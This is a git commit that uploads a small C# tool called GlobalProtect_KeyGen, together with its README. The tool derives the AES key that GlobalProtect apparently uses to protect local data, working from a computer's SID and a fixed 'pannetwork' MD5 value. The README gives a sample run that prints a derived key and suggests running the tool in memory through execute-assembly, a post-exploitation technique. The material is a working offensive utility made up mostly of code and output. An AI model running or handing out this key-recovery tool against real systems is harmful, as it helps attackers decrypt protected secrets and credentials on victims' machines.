30fa4cd59262bb95424bcc5b87214cc11651e185
lefayjey <lefayjey@lefayjey.fr>
2025-05-10 00:43:56 +0200

    Initial upload

---
+++ Program.cs
@@ -0,0 +1,88 @@
+﻿using System;
+using System.Linq;
+using System.Security.Cryptography;
+using System.Security.Principal;
+using System.Text;
+
+namespace GlobalProtect_KeyGen {
+    class Program
+    {
+        static void Main(string[] args)
+
+        {
+            if (args.Length == 0)
+            {
+                Console.WriteLine("Usage: GlobalProtect_KeyGen.exe Computer_SID_VALUE\n");
+                Console.WriteLine("Get Computer SID using PowerShell:");
+                Console.WriteLine("((get-wmiobject -query \"Select * from Win32_UserAccount Where LocalAccount = TRUE\").SID -replace \"\\d+$\",\"\" -replace \".$\")[0]");
+                return;
+            }
+
+            string SID = args[0];
+            byte[] aesKey = GetKey(SID);
+
+        }
+
+        public static byte[] GetComputerSID(string sidValue)
+        {
+            SecurityIdentifier sid = new SecurityIdentifier(sidValue);
+            byte[] sidBytes = new byte[sid.BinaryLength];
+            sid.GetBinaryForm(sidBytes, 0);
+            Console.WriteLine($"\t[*] Computer SID : {sid}");
+
+            StringBuilder sidString = new StringBuilder(sidBytes.Length * 2);
+
+            foreach (byte b in sidBytes)
+            {
+                sidString.Append(b.ToString("X2"));
+            }
+
+            Console.WriteLine($"\t[*] Computer SID (Hex) : {sidString}");
+
+            return sidBytes;
+        }
+
+        private static byte[] GetMD5Hash(byte[] input)
+        {
+            using (MD5 md5 = MD5.Create())
+            {
+                byte[] hashBytes = md5.ComputeHash(input);
+                return hashBytes;
+
+            }
+        }
+
+        private static byte[] ConcatByteArrays(params byte[][] arrays)
+        {
+            return arrays.SelectMany(x => x).ToArray();
+        }
+
+        private static string BytesToString(byte[] bytes)
+        {
+            StringBuilder sb = new StringBuilder();
+            foreach (byte b in bytes)
+            {
+                sb.Append(b.ToString("X2"));
+            }
+            return sb.ToString();
+
+        }
+
+        public static byte[] GetKey(string sidValue)
+        {
+            Console.WriteLine($"[*] Deriving AES key from computer SID");
+
+            byte[] panMD5 = GetMD5Hash(Encoding.ASCII.GetBytes("pannetwork"));
+            byte[] sidBytes = GetComputerSID(sidValue);
+            byte[] combinedBytes = ConcatByteArrays(sidBytes, panMD5);
+
+            byte[] md5Key = GetMD5Hash(combinedBytes);
+            byte[] finalKey = ConcatByteArrays(md5Key, md5Key);
+
+            Console.WriteLine($"\t[*] Derived AES Key: {BytesToString(finalKey)}");
+
+            return finalKey;
+        }
+
+    }
+}
---
+++ README.md
@@ -0,0 +1,23 @@
+# GlobalProtect_KeyGen
+
+Tool for generating encryption key of GlobalProtect from Computer SID.
+
+## Usage
+
+Run as standalone or in-memory via execute-assembly or equivalent.
+
+```
+> GlobalProtect_KeyGen.exe
+Usage: GlobalUnProtect.exe Computer_SID_VALUE
+```
+
+```
+> GlobalProtect_KeyGen.exe S-1-5-21-3853142505-1760735370-2458319090
+[*] Deriving AES key from computer SID
+        [*] Computer SID : S-1-5-21-3853142505-1760735370-2458319090
+        [*] Computer SID (Hex) : 010400000000000515000000E949AAE58AB0F268F2F88692
+        [*] Derived AES Key: FFD40E0D6894B0582E3AA0F2899F9FBEFFD40E0D6894B0582E3AA0F2899F9FBE
+```
+
+# Original Source Code
+https://github.com/rotarydrone/GlobalUnProtect
